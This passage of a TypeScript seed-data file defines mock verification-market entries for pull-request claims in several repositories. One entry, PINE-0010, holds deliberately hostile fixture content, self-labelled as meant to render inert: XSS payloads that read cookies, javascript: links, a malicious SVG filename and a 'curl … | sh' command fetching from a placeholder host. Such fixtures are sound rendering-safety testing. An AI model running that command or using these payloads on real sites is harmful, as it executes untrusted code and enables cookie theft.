      "For the frozen configuration and allowed states, each reporter-funding deposit's principal is allocated only from eligible bridging/reporter funds in the specified accounting scope. It never consumes a pair's arbitration allocation or the operator's transaction-gas reserve. Paying the reporter-funding transaction's own gas fee from the operator reserve is permitted.",
    violation:
      "reporter-deposit principal can consume a pair's arbitration allocation or the operator transaction-gas reserve",
    scope: {
      inScope: [
        'src/funding/reporter-planner.ts',
        'src/accounting/reservations.ts',
        'src/accounting/gas-reserve.ts',
        'src/accounting/ledger.ts',
        'Gnosis ↔ Arbitrum gateway pair',
      ],
      outOfScope: [
        'LI.FI route execution and real bridging (adapter is simulated)',
        'Price feeds and rate updates',
        'Liveness, routing integration and deployment readiness',
      ],
    },
    parameters: {
      invariant:
        'Reporter-deposit principal is funded only from eligible bridging/reporter allocations; never from arbitration allocations or the operator gas reserve.',
      sourceRequirement: 'gateway-balancer-bot-spec v0.4 §2.2, §4.2; §12 tests 3 and 7',
      permittedStartingStates:
        'Any journal state reachable by running the keeper from genesis through the public planner API, including: a reporter below its funding threshold, no eligible bridging-fee funds, and protected arbitration funds and operator gas reserves present.',
      reachability: 'Setup must use the keeper’s own planning/accounting code; fabricated journal rows are not admissible.',
      accounts: ['operator EOA (shared custody)', 'reporter EOA (Arbitrum)'],
      chains: ['gnosis (100)', 'arbitrum (42161)'],
      routes: ['gnosis→arbitrum reporter top-up via simulated bridge adapter'],
      accountingCategories: ['arbitration allocation', 'bridging/reporter allocation', 'operator gas reserve'],
      faultModel: ['process_crash', 'timeout', 'rpc_error'],
      simulatedAdapters: ['LI.FI bridge adapter (BRIDGE_ADAPTER=simulated)', 'Arbitrum RPC (anvil fork)'],
      realIntegrationEvidence: 'Not required and not accepted as validation of real LI.FI execution.',
    },
    faultModel:
      'Keeper process crash/restart at any point, RPC timeouts and dropped responses. No arbitrary journal or database corruption.',
    allowedInputs: 'Journal states reachable through the planner API; any reporter threshold and balance values within the config limits.',
    assumptions: [
      'Funds sharing the same operator EOA is not itself a violation; allocations, reservations, planned amounts and resulting accounting must show the prohibited use.',
      'The simulated bridge adapter settles deterministically.',
      'Gas prices on Gnosis between 0.5 and 50 gwei.',
    ],
    exclusions: [
      "The operator reserve paying the gas fee of the reporter-funding transaction (gas fee ≠ deposit principal).",
      'Live transactions, production keys, or real customer funds.',
      'Fabricated journal states not reachable under the agreed model.',
      'Evidence that real LI.FI routes work or fail.',
    ],
    env: {
      runtime: 'node 22.14.0',
      packageManager: 'pnpm 10.9.2',
      lockPath: 'pnpm-lock.yaml',
      config: {
        CHAIN_PAIR: 'gnosis↔arbitrum',
        BRIDGE_ADAPTER: 'simulated',
        RESERVE_GAS_MIN: '0.75',
        RESERVE_GAS_TARGET: '2.0',
        REPORTER_FUNDING_THRESHOLD: '0.02',
        REPORTER_TOPUP_AMOUNT: '0.05',
        ARBITRATION_ALLOCATION_MIN: '25',
        JOURNAL_PATH: './.journal/test.db',
      },
      containerImage: 'ghcr.io/foundry-rs/foundry:v1.0.0@sha256:5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b',
      externalState: 'anvil forks: Gnosis block 41,980,000 and Arbitrum block 268,400,000 (no live RPC)',
      reproductionCommand: 'pnpm vitest run test/reporter-funding.spec.ts test/accounting-separation.spec.ts',
      setupSteps: [...NODE_SETUP, 'docker compose -f docker-compose.test.yml up -d anvil-gnosis anvil-arbitrum', 'pnpm keeper:init --config config/test.pair.json'],
      notes: 'Specification snapshot: gateway-balancer-bot-spec v0.4 (sections 2.2, 4.2, 12). No deployments, signing with production keys, or live transactions are authorized.',
    },
    specReference: {
      label: 'gateway-balancer-bot-spec v0.4 §2.2, §4.2, §12',
      url: 'https://github.com/kleros/kleros-v2/blob/dev/docs/gateway-balancer-bot-spec.md',
    },
    createdH: -48,
    deadlineH: 120,
    minBond: '10',
    status: 'open',
    market: { initial: 0.1, yes: 0.12, invalid: 0.02, liquidity: '400', volume: '312.6', volume24h: '58.4', traders: 12, trades: 7 },
    evidence: [
      {
        kind: 'clarification',
        title: 'Gas fee of the top-up transaction is not deposit principal',
        summary:
          'Clarifying the exclusion: when the operator reserve pays the gas of the reporter-funding transaction, that is permitted. A qualifying counterexample must show the deposit *principal* (the value transferred to the reporter) being allocated from the arbitration allocation or the operator gas reserve, e.g. via the reservation ledger or planned transaction value.',
        by: wallets.mara,
        h: -40,
      },
      {
        kind: 'commitment',
        title: 'Commitment 0x2b7a…c40e (reveal pending)',
        summary:
          'Commit-reveal submission: hash of an evidence package committed before the deadline. The package will be revealed according to the manifest. Commit-reveal is shown for demonstration and is a launch gate.',
        by: actors.kestrel,
        h: -14,
        commitment: { revealed: false, hash: fakeHash('commitment:9:kestrel') },
        jump: 0.25,
      },
    ],
    funding: { liquidity: '400', spendingLimit: '450' },
    tags: ['keeper', 'accounting', 'flagship', 'kleros'],
  },

  // -------------------------------------------------------------------------
  // PINE-0010 · OPEN (9h left) · HOSTILE evidence · acme-labs/fastparse
  // -------------------------------------------------------------------------
  {
    number: 10,
    repo: 'acme-labs/fastparse',
    pr: 231,
    creator: wallets.hana,
    policyId: 'FUNC-001',
    claimClass: 'format-conformance',
    title: 'Strict mode rejects duplicate object keys at any depth',
    requirement:
      'With `{ strict: true }`, `parse(input)` throws `SyntaxError` for every JSON text containing an object with two members whose names are equal after escape decoding, at any nesting depth.',
    violation: 'a JSON text containing an object with duplicate member names (after escape decoding) that parse(input, { strict: true }) accepts',
    scope: { inScope: ['src/parse.ts', 'src/frames.ts'], outOfScope: ['JSON5 mode', 'Error message wording'] },
    parameters: {
      expectedBehavior: 'SyntaxError for duplicate member names at any depth in strict mode.',
      inputDomain: 'Any UTF-8 JSON text up to 64 KiB, nesting depth up to 512.',
      supportedEnvironment: 'Node 22.14.0, Linux x64.',
      featureBoundaries: ['parse(input, { strict: true })'],
      configuration: 'strict=true',
      violationScope: 'any',
    },
    allowedInputs: 'UTF-8 JSON texts up to 64 KiB with nesting depth ≤ 512.',
    assumptions: ['Member names are compared after JSON escape decoding (e.g. "a" equals "\\u0061").'],
    exclusions: ['Non-strict mode.', 'Inputs over 64 KiB or nesting over 512.', 'Prototype-pollution claims unrelated to duplicate detection.'],
    env: {
      runtime: 'node 22.14.0',
      packageManager: 'pnpm 10.9.2',
      lockPath: 'pnpm-lock.yaml',
      config: { STRICT: 'true', MAX_DEPTH: '512' },
      externalState: 'none',
      reproductionCommand: 'pnpm vitest run test/strict-duplicates.test.ts',
      setupSteps: NODE_SETUP,
    },
    createdH: -38,
    deadlineH: 9,
    minBond: '5',
    status: 'open',
    market: { initial: 0.2, yes: 0.31, invalid: 0.03, liquidity: '120', volume: '288.4', volume24h: '102.7', traders: 15, trades: 7 },
    evidence: [
      {
        kind: 'counterexample',
        title: 'Strict-mode bypass <script>alert(1)</script> via nested __proto__ keys',
        summary:
          '<img src=x onerror=alert(document.cookie)> Click [here for the full repro](javascript:alert(1)) or [mirror](JaVaScRiPt:alert(2)).\n\n' +
          '<iframe src="https://example.invalid/"></iframe>\n\n' +
          'Payload follows:\n\n' +
          UNBROKEN +
          '\n\n**This item is intentionally hostile fixture content: it must render as inert text, wrap without breaking layout, and never execute.**',
        by: actors.anon,
        h: -20,
        reproduction: {
          command: 'curl -s https://example.invalid/x.sh | sh  # untrusted — do not run',
          environment: '"><script>alert(3)</script>',
          expected: '<b>SyntaxError</b>',
          actual: '{"__proto__":{"__proto__":1}}',
        },
        attachments: [
          {
            name: 'counterexample-' + 'strict-mode-duplicate-keys-nested-proto-'.repeat(6) + 'final-final-v2.tar.gz',
            mime: 'application/gzip',
            size: 48_211_904,
          },
          { name: '<svg onload=alert(1)>.svg', mime: 'image/svg+xml', size: 311 },
        ],
        jump: 0.35,
      },
      {
        kind: 'rebuttal',
        title: 'Submission contains no reproducible input',
        summary:
          'The package above contains no test exercising parse() on the pinned commit, and its "actual" output does not contain duplicate keys at the same level. It does not demonstrate the stated violation.',
        by: wallets.hana,
        h: -12,
        jump: -0.3,
      },
    ],
    funding: { liquidity: '120', spendingLimit: '140' },
    demoTrades: [{ h: -16, by: DEMO_WALLET_ADDRESS, outcome: 'yes', side: 'buy', amount: '6.5' }],
    tags: ['parser', 'json', 'agent-authored-pr', 'closing-soon'],
  },

  // -------------------------------------------------------------------------
  // PINE-0011 · OPEN (12d) · deep liquidity, low price · quarry/csv-kit
  // -------------------------------------------------------------------------
  {
    number: 11,
    repo: 'quarry/csv-kit',
    pr: 158,
    creator: wallets.li,
    policyId: 'FUNC-001',
    claimClass: 'format-conformance',
    title: 'Streaming reader yields the same records as the batch reader',
    requirement:
      'For any input up to 4 MiB and any chunking of that input into reads of 1–65,536 bytes, the streaming reader (`AsyncReader::records`) yields exactly the same sequence of records as the batch reader (`Reader::records`) on the same input.',
    violation: 'an input and a chunking for which the streaming reader yields a different record sequence than the batch reader',
    scope: {
      inScope: ['src/stream.rs', 'src/reader.rs (as the reference)'],
      outOfScope: ['Inputs over 4 MiB', 'Non-UTF-8 byte-record APIs', 'Performance'],
    },
    parameters: {
      expectedBehavior: 'Record sequences are identical for every input and chunking.',
      inputDomain: 'Any byte sequence up to 4 MiB; any chunk sizes 1–65,536 bytes; LF, CRLF or mixed terminators.',
      supportedEnvironment: 'Rust 1.82.0 stable, tokio 1.41, Linux x64.',
      featureBoundaries: ['AsyncReader::records', 'Reader::records'],
      configuration: 'Default ReaderBuilder options.',
      violationScope: 'any',
    },
    allowedInputs: 'Byte sequences up to 4 MiB, chunked arbitrarily.',
    assumptions: ['The batch reader is the reference, even where it deviates from RFC 4180.'],
    exclusions: ['Differences in error messages when both readers return an error.', 'Inputs over 4 MiB.'],
    env: {
      runtime: 'rustc 1.82.0 (stable)',
      packageManager: 'cargo 1.82.0',
      lockPath: 'Cargo.lock',
      config: { TOKIO: '1.41.1', FEATURES: 'async' },
      externalState: 'none',
      reproductionCommand: 'cargo test --features async --test parity',
      setupSteps: ['rustup toolchain install 1.82.0', 'cargo fetch --locked'],
    },
    createdH: -80,
    deadlineH: 288,
    minBond: '10',
    status: 'open',
    market: { initial: 0.06, yes: 0.04, invalid: 0.01, liquidity: '2400', volume: '1830', volume24h: '120.5', traders: 19, trades: 8, feeBps: 30 },
    evidence: [],
    funding: { liquidity: '2400', spendingLimit: '2600' },
    tags: ['rust', 'streaming', 'differential', 'agent-authored-pr'],
  },

  // -------------------------------------------------------------------------
  // PINE-0012 · OPEN · thin $5 market, high price · tidewater/ledger-sync
  // -------------------------------------------------------------------------
  {
    number: 12,
    repo: 'tidewater/ledger-sync',
    pr: 29,
    creator: wallets.diego,
    policyId: 'BOT-001',
    claimClass: 'stale-inputs',
    title: 'Stale or disagreeing price feeds block FX rate updates',
    requirement:
      'A rate update for a currency pair is written to the ledger only if at least 2 observations younger than MAX_AGE_SECONDS agree within MAX_DEVIATION_BPS; otherwise no update is written and the previous rate stays.',
    violation: 'a ledger rate update written while fewer than 2 fresh, agreeing observations were available',
    scope: { inScope: ['src/guard.ts', 'src/sync.ts', 'src/feeds/*'], outOfScope: ['Ledger API availability', 'Feed accuracy'] },
    parameters: {
      invariant: 'No rate update without ≥2 fresh agreeing observations.',
      sourceRequirement: 'PR #29 description; docs/rates.md',
      permittedStartingStates: 'Any feed responses (values, timestamps, errors) from the simulated Chainlink and Pyth adapters.',
      reachability: 'Feed responses are injected through the simulated adapters only.',
      accounts: [],
      chains: [],
      routes: [],
      accountingCategories: [],
      faultModel: ['timeout', 'rpc_error', 'process_crash'],
      simulatedAdapters: ['Chainlink adapter', 'Pyth adapter', 'ledger API'],
      realIntegrationEvidence: 'Simulation only; does not validate real feeds.',
    },
    faultModel: 'Feed timeouts, errors, stale or missing observations; process restart between polls.',
    assumptions: ['The keeper clock is accurate within 1 s.'],
    exclusions: ['Incorrect but fresh and agreeing feed values.', 'Ledger API accepting writes from other clients.'],
    env: {
      runtime: 'node 22.14.0',
      packageManager: 'pnpm 10.9.2',
      lockPath: 'pnpm-lock.yaml',
      config: { MAX_AGE_SECONDS: '300', MAX_DEVIATION_BPS: '50', MIN_OBSERVATIONS: '2', PAIRS: 'EUR/USD,GBP/USD' },
      externalState: 'none',
      reproductionCommand: 'pnpm vitest run test/guard.test.ts',
      setupSteps: NODE_SETUP,
    },
    createdH: -70,
    deadlineH: 72,
    minBond: '5',
    status: 'open',
    market: { initial: 0.2, yes: 0.62, invalid: 0.02, liquidity: '5', volume: '21.3', volume24h: '6.1', traders: 4, trades: 4 },
    evidence: [
      {
        kind: 'counterexample',
        title: 'A cached observation counts toward the 2-observation quorum',
        summary:
          'When the Pyth adapter times out, sync() reuses the last cached Pyth observation but stamps it with the poll time. With one fresh Chainlink value, the guard sees two "fresh" observations and writes an update.',
        by: actors.diffbot,
        h: -18,
        reproduction: {
          command: 'pnpm vitest run test/pine-0012.test.ts',
          environment: 'node 22.14.0, pinned lockfile, simulated adapters',
          expected: 'no ledger write',
          actual: 'ledger.writeRate("EUR/USD", 1.0861) called once',
        },
        attachments: [{ name: 'pine-0012.test.ts', mime: 'text/typescript', size: 2207 }],
        jump: 1.5,
      },
    ],
    funding: { liquidity: '5', spendingLimit: '8' },
    tags: ['keeper', 'price-feeds', 'thin-market'],
  },

  // -------------------------------------------------------------------------
  // PINE-0013 · OPEN · SPONSORED · fernhill/i18n-plurals (claude[bot] PR)
  // -------------------------------------------------------------------------
  {
    number: 13,
    repo: 'fernhill/i18n-plurals',
    pr: 66,
    creator: wallets.ines,
    policyId: 'FUNC-001',
    claimClass: 'format-conformance',
    title: 'Arabic plural rule matches CLDR 46 for 0–10,000',
    requirement:
      "For every integer n from 0 to 10,000, `pluralCategory('ar', n)` returns the category defined by the CLDR 46 plural rules for Arabic.",
    violation: "an integer n in 0..10,000 for which pluralCategory('ar', n) differs from the CLDR 46 Arabic plural category",
    scope: { inScope: ["pluralCategory('ar', n) for integers"], outOfScope: ['Decimal operands', 'Other locales', 'Ordinal rules'] },
    parameters: {
      expectedBehavior: "pluralCategory('ar', n) equals the CLDR 46 category for each integer 0..10,000.",
      inputDomain: 'Integers 0..10,000.',
      supportedEnvironment: 'Node 22.14.0.',
      featureBoundaries: ['pluralCategory'],
      configuration: 'CLDR data from data/cldr-46/plurals.json as pinned.',
      violationScope: 'any',
    },
    assumptions: ['CLDR 46 plurals.json at the pinned commit is the reference.'],
    exclusions: ['Decimal and negative operands.', 'Ordinal plural rules.'],
    env: {
      runtime: 'node 22.14.0',
      packageManager: 'pnpm 10.9.2',
      lockPath: 'pnpm-lock.yaml',
      config: { CLDR_VERSION: '46', LOCALE: 'ar' },
      externalState: 'none',
      reproductionCommand: 'pnpm vitest run test/ar.test.ts',
      setupSteps: NODE_SETUP,
    },
    createdH: -42,
    deadlineH: 168,
    minBond: '5',
    status: 'open',
    market: { initial: 0.15, yes: 0.18, invalid: 0.02, liquidity: '600', volume: '245', volume24h: '33.8', traders: 9, trades: 5 },
    evidence: [
      {
        kind: 'clarification',
        title: 'Reference data is the pinned CLDR 46 file',
        summary: 'Questions came up about CLDR 47 changes. The reference is data/cldr-46/plurals.json at the pinned commit; later CLDR releases are out of scope.',
        by: wallets.ines,
        h: -30,
      },
    ],
    funding: { liquidity: '600', spendingLimit: '650' },
    sponsored: true,
    tags: ['i18n', 'agent-authored-pr', 'sponsored'],
  },

  // -------------------------------------------------------------------------
  // PINE-0014 · OPEN (40h) · commit-reveal pair · northwind/auth-gateway (Devin PR)
  // -------------------------------------------------------------------------
  {
    number: 14,
    repo: 'northwind/auth-gateway',
    pr: 402,
    creator: wallets.sofia,
    policyId: 'FUNC-001',
    claimClass: 'access-boundary',
    title: "Search never returns documents from another tenant",
    requirement:
      "For any authenticated non-admin user in tenant T, `GET /v2/search` and `GET /v2/search/suggest` never return a document id, title or snippet belonging to a tenant other than T.",
    violation: "GET /v2/search or GET /v2/search/suggest returning a document id, title or snippet from another tenant to a non-admin user",
    scope: {
      inScope: ['GET /v2/search', 'GET /v2/search/suggest', 'internal/search'],
      outOfScope: ['Admin search', 'Document access endpoints (see PINE-0005)'],
    },
    parameters: {
      expectedBehavior: 'Search results are restricted to the caller’s tenant.',
      inputDomain: 'Any query string, filters and pagination parameters accepted by the API; any non-admin session.',
      supportedEnvironment: 'Go 1.23.4, Postgres 16.4, docker compose stack as pinned.',
      featureBoundaries: ['GET /v2/search', 'GET /v2/search/suggest'],
      configuration: 'SEARCH_BACKEND=postgres, TENANT_MODE=strict',
      violationScope: 'any',
    },
    faultModel: 'Concurrent indexing and queries; index rebuild during queries.',
    assumptions: ['Tenants are created through the admin API before the test.'],
    exclusions: ['Admin sessions.', 'Timing side channels.', 'Result counts without ids, titles or snippets.'],
    env: {
      runtime: 'go 1.23.4',
      lockPath: 'go.sum',
      config: { SEARCH_BACKEND: 'postgres', TENANT_MODE: 'strict', INDEX_REBUILD_INTERVAL: '60s' },
      containerImage: 'ghcr.io/northwind/auth-gateway-dev@sha256:8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d',
      externalState: 'Fresh database seeded by scripts/seed-dev.sql',
      reproductionCommand: 'make e2e TEST=./e2e/search_tenant_test.go',
      setupSteps: ['docker compose up -d', 'make seed'],
    },
    createdH: -44,
    deadlineH: 40,
    minBond: '10',
    status: 'open',
    mechanism: 'erc1497-arbitrator-proxy',
    market: { initial: 0.15, yes: 0.22, invalid: 0.02, liquidity: '340', volume: '510.7', volume24h: '144.2', traders: 21, trades: 8 },
    evidence: [
      {
        kind: 'commitment',
        title: 'Commitment 0x8d21…07b3',
        summary: 'Hash of an evidence package committed before revealing, to reduce front-running. Revealed below.',
        by: actors.fuzzwright,
        h: -20,
        commitment: { revealed: true, revealedH: -6, hash: fakeHash('commitment:14:fuzzwright') },
      },
      {
        kind: 'counterexample',
        title: 'Suggest endpoint leaks titles during index rebuild',
        summary:
          'While INDEX_REBUILD_INTERVAL triggers a rebuild, `/v2/search/suggest?q=Q3` briefly reads from the shadow index, which is built without the tenant column filter. Titles from tenant B are returned to a tenant A user. Reveals commitment 0x8d21…07b3.',
        by: actors.fuzzwright,
        h: -6,
        commitment: { revealed: true, revealedH: -6, hash: fakeHash('commitment:14:fuzzwright') },
        reproduction: {
          command: 'make e2e TEST=./e2e/pine_0014_test.go',
          environment: 'pinned compose stack, INDEX_REBUILD_INTERVAL=60s, 200 queries/s',
          expected: 'only tenant A titles',
          actual: '3 of 12,000 responses contained tenant B titles',
        },
        attachments: [{ name: 'pine_0014_test.go', mime: 'text/x-go', size: 3880 }, { name: 'leaked-responses.jsonl', mime: 'application/x-ndjson', size: 2913 }],
        jump: 0.9,
      },
    ],
    funding: { liquidity: '340', spendingLimit: '400' },
    tags: ['authz', 'multi-tenant', 'agent-authored-pr', 'commit-reveal'],
  },

  // -------------------------------------------------------------------------
  // PINE-0015 · PUBLISHING (split rejected → resumable) · demo user
  // -------------------------------------------------------------------------
  {
    number: 15,
    repo: 'kleros/gateway-balancer-bot',
    pr: 52,
    withBase: true,
    creator: wallets.mara,
    policyId: 'BOT-001',
    claimClass: 'duplicate-operations',
    title: 'Recovery never starts a second bridge for the same operation',
    requirement:
      'After a bridge succeeds and the destination swap fails or the keeper crashes before swap settlement, recovery resumes the same operation id and never plans a new bridge for it.',
    violation: 'recovery planning a second bridge transfer for an operation whose first bridge already succeeded',
    scope: {
      inScope: ['src/journal/recover.ts', 'src/bridge/operation.ts'],
      outOfScope: ['Real LI.FI execution', 'Requote pricing-loss budgets'],
    },
    parameters: {
      invariant: 'One bridge per operation id, across crashes and swap failures.',
      sourceRequirement: 'gateway-balancer-bot-spec v0.4 §6.3',
      permittedStartingStates: 'Journals produced by the keeper from genesis with a bridge receipt recorded and the swap leg pending or failed.',
      reachability: 'Through the keeper’s own planning code with allowed faults.',
      accounts: ['operator EOA'],
      chains: ['gnosis (100)', 'arbitrum (42161)'],
      routes: ['gnosis→arbitrum bridge then swap'],
      accountingCategories: ['bridging/reporter allocation'],
      faultModel: ['process_crash', 'timeout', 'rpc_error'],
      simulatedAdapters: ['LI.FI bridge adapter (simulated)', 'DEX swap adapter (simulated)'],
      realIntegrationEvidence: 'Not required.',
    },
    faultModel: 'Keeper crash at any point after the bridge receipt; swap adapter failure; RPC timeouts.',
    assumptions: ['The simulated bridge adapter reports receipts exactly once.'],
    exclusions: ['Real bridge or swap execution.', 'Fabricated journal states.'],
    env: {
      runtime: 'node 22.14.0',
      packageManager: 'pnpm 10.9.2',
      lockPath: 'pnpm-lock.yaml',
      config: { CHAIN_PAIR: 'gnosis↔arbitrum', BRIDGE_ADAPTER: 'simulated', SWAP_ADAPTER: 'simulated', JOURNAL_PATH: './.journal/test.db' },
      externalState: 'anvil forks: Gnosis block 41,980,000 and Arbitrum block 268,400,000',
      reproductionCommand: 'pnpm vitest run test/recovery.spec.ts',
      setupSteps: [...NODE_SETUP, 'docker compose -f docker-compose.test.yml up -d anvil-gnosis anvil-arbitrum'],
    },
    createdH: -3,
    deadlineH: 165,
    minBond: '10',
    status: 'publishing',
    market: { initial: 0.15, yes: 0.15, invalid: 0.02, liquidity: '0', volume: '0', volume24h: '0', traders: 0 },
    evidence: [],
    publication: {
      steps: [
        { id: 'upload_manifest', status: 'confirmed', h: -3.4 },
        { id: 'create_market', status: 'confirmed', h: -3 },
        { id: 'approve_collateral', status: 'confirmed', h: -2.9 },
        { id: 'split_position', status: 'failed', h: -2.85, error: 'User rejected the request.' },
        { id: 'add_liquidity_yes', status: 'idle' },
        { id: 'add_liquidity_no', status: 'idle' },
      ],
      resumable: true,
      note:
        'The market exists and its terms are frozen. The exact 250 sDAI approval is confirmed, but splitting collateral into outcome tokens was rejected in the wallet, so the pools hold no liquidity and the market has no price yet. Resume to split and add liquidity, or leave it unfunded. No collateral has moved.',
    },
    funding: { liquidity: '250', spendingLimit: '300' },
    tags: ['keeper', 'recovery', 'agent-authored-pr'],
  },

  // -------------------------------------------------------------------------
  // PINE-0016 · FAILED (create_market reverted) · demo user
  // -------------------------------------------------------------------------
  {
    number: 16,
    repo: 'harbor/rate-limiter',
    pr: 85,
    creator: wallets.mara,
    policyId: 'FUNC-001',
    claimClass: 'bug-fix',
    title: 'Token bucket refill never exceeds burst capacity',
    requirement:
      'For any configuration with `Rate>0` and `Burst≥1` and any sequence of `Allow`/`Wait` calls separated by idle periods up to 10 years, the bucket never holds more than `Burst` tokens.',
    violation: 'a token bucket holding more than Burst tokens after a refill',
    scope: { inScope: ['bucket/bucket.go'], outOfScope: ['Sliding-window backend', 'Redis backend'] },
    parameters: {
      expectedBehavior: 'tokens <= Burst at all times.',
      inputDomain: 'Rate in (0, 1e9]; Burst in 1..1e9; idle periods up to 10 years (simulated clock).',
      supportedEnvironment: 'Go 1.23.4.',
      featureBoundaries: ['bucket.New', 'Bucket.Allow', 'Bucket.Wait'],
      configuration: 'In-memory backend; simulated clock.',
      violationScope: 'any',
    },
    assumptions: ['A simulated clock is used to model long idle periods.'],
    exclusions: ['Redis backend.', 'Clock going backwards.'],
    env: {
      runtime: 'go 1.23.4',
      lockPath: 'go.sum',
      config: { BACKEND: 'memory', CLOCK: 'simulated' },
      externalState: 'none',
      reproductionCommand: 'go test ./bucket/... -run TestRefillClamp -count=1',
      setupSteps: ['go mod download'],
    },
    createdH: -200,
    deadlineH: -32,
    minBond: '5',
    status: 'failed',
    market: null,
    evidence: [],
    publication: {
      steps: [
        { id: 'upload_manifest', status: 'confirmed', h: -200.2 },
        { id: 'create_market', status: 'failed', h: -199.5, error: 'Transaction reverted: out of gas (gas used 1,199,872 of 1,200,000 limit set in wallet).' },
        { id: 'approve_collateral', status: 'idle' },
        { id: 'split_position', status: 'idle' },
        { id: 'add_liquidity_yes', status: 'idle' },
        { id: 'add_liquidity_no', status: 'idle' },
      ],
      resumable: false,
      note:
        'Market creation reverted, so nothing beyond the manifest pin happened: no market, no Reality.eth question, no collateral moved. The publication was abandoned and the frozen evidence deadline in this manifest has since passed, so it cannot be retried as-is. Start a new verification to choose a new deadline; only the manifest pin and the reverted transaction’s gas were spent.',
    },
    funding: { liquidity: '80', spendingLimit: '100' },
    tags: ['go', 'rate-limiting'],
  },

  // -------------------------------------------------------------------------
  // PINE-0017 · OPEN · re-filed after PINE-0004 · meshwire/webhook-relay
  // -------------------------------------------------------------------------
  {
    number: 17,
    repo: 'meshwire/webhook-relay',
    pr: 318,
    creator: wallets.akosua,
    policyId: 'FUNC-001',
    claimClass: 'bug-fix',
    title: 'At-most-once mode never delivers an event twice to a subscriber',
    requirement:
      'With DELIVERY_MODE=at_most_once, for any subscriber and event id, at most one HTTP request carrying that event id reaches the subscriber endpoint, including across relay restarts and subscriber timeouts.',
    violation: 'two HTTP requests carrying the same event id reaching the same subscriber endpoint with DELIVERY_MODE=at_most_once',
    scope: { inScope: ['src/deliver.ts', 'src/ledger.ts', 'src/retry.ts'], outOfScope: ['DELIVERY_MODE=at_least_once', 'Subscriber-side deduplication'] },
    parameters: {
      expectedBehavior: 'At most one request per (subscriber, event id) in at_most_once mode.',
      inputDomain: 'Any event stream; endpoints that time out, reset connections or return 5xx; relay restarts.',
      supportedEnvironment: 'Node 22.14.0, Postgres 16.4.',
      featureBoundaries: ['deliver()', 'retry queue', 'dedupe ledger'],
      configuration: 'DELIVERY_MODE=at_most_once; RETRY_MAX=5',
      violationScope: 'any',
    },
    faultModel: 'Subscriber timeouts, connection resets and 5xx; relay process crash/restart.',
    assumptions: ['Postgres is available and durable.'],
    exclusions: ['DELIVERY_MODE=at_least_once (documented to retry).', 'Upstream duplicates with different event ids.'],
    env: {
      runtime: 'node 22.14.0',
      packageManager: 'pnpm 10.9.2',
      lockPath: 'pnpm-lock.yaml',
      config: { DELIVERY_MODE: 'at_most_once', RETRY_MAX: '5', RETRY_BASE_MS: '500' },
      containerImage: 'postgres:16.4@sha256:7c1e4f2a9b3d5e6f8a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f',
      externalState: 'none',
      reproductionCommand: 'pnpm vitest run test/at-most-once.test.ts',
      setupSteps: [...NODE_SETUP, 'docker compose up -d postgres'],
    },
    createdH: -34,
    deadlineH: 144,
    minBond: '5',
    status: 'open',
    market: { initial: 0.25, yes: 0.27, invalid: 0.02, liquidity: '180', volume: '96.5', volume24h: '12.4', traders: 7, trades: 5 },
    evidence: [
      {
        kind: 'clarification',
        title: 'Supersedes PINE-0004 (resolved invalid)',
        summary: 'PINE-0004 resolved invalid because its pinned config used at_least_once. This claim pins DELIVERY_MODE=at_most_once explicitly; at_least_once behavior is excluded.',
        by: wallets.akosua,
        h: -33,
      },
    ],
    funding: { liquidity: '180', spendingLimit: '220' },
    tags: ['webhooks', 'idempotency', 're-filed'],
  },

  // -------------------------------------------------------------------------
  // PINE-0018 · OPEN · copilot PR · tidewater/payroll-scheduler
  // -------------------------------------------------------------------------
  {
    number: 18,
    repo: 'tidewater/payroll-scheduler',
    pr: 97,
    creator: wallets.jonas,
    policyId: 'BOT-001',
    claimClass: 'limits-adherence',
    title: 'Payouts only reach allowlisted recipients within the per-run cap',
    requirement:
      'Every payout dispatched to an adapter goes to a recipient on the allowlist loaded from PAYOUT_ALLOWLIST_PATH at run start, and the sum of payouts dispatched in one run never exceeds MAX_RUN_TOTAL.',
    violation: 'a payout dispatched to a non-allowlisted recipient, or dispatched payouts in one run summing to more than MAX_RUN_TOTAL',
    scope: { inScope: ['scheduler/limits.py', 'scheduler/dispatch.py'], outOfScope: ['Allowlist file integrity', 'Currency conversion'] },
    parameters: {
      invariant: 'Recipient ∈ allowlist and Σ run payouts ≤ MAX_RUN_TOTAL.',
      sourceRequirement: 'PR #97 description',
      permittedStartingStates: 'Any approved batch of up to 500 payouts; any allowlist file.',
      reachability: 'Batches submitted through the approval API.',
      accounts: ['simulated bank adapter', 'simulated on-chain adapter'],
      chains: [],
      routes: [],
      accountingCategories: ['payroll run total'],
      faultModel: ['process_crash', 'concurrent_runs'],
      simulatedAdapters: ['bank adapter (in-memory)', 'on-chain adapter (anvil)'],
      realIntegrationEvidence: 'Not required.',
    },
    faultModel: 'Process crash and restart; two runs started concurrently for different batches.',
    assumptions: ['The allowlist file is not modified during a run.'],
    exclusions: ['Editing the allowlist file mid-run.', 'Real bank or chain transfers.'],
    env: {
      runtime: 'python 3.12.7',
      packageManager: 'uv 0.5.4',
      lockPath: 'uv.lock',
      config: { PAYOUT_ALLOWLIST_PATH: './fixtures/allowlist.csv', MAX_RUN_TOTAL: '250000', CURRENCY: 'EUR' },
      externalState: 'none',
      reproductionCommand: 'uv run pytest tests/test_limits.py -q',
      setupSteps: ['uv sync --frozen'],
    },
    createdH: -26,
    deadlineH: 216,
    minBond: '10',
    status: 'open',
    market: { initial: 0.1, yes: 0.09, invalid: 0.02, liquidity: '850', volume: '140.2', volume24h: '40.1', traders: 6, trades: 4 },
    evidence: [],
    funding: { liquidity: '850', spendingLimit: '900' },
    tags: ['payroll', 'limits', 'agent-authored-pr'],
  },
]
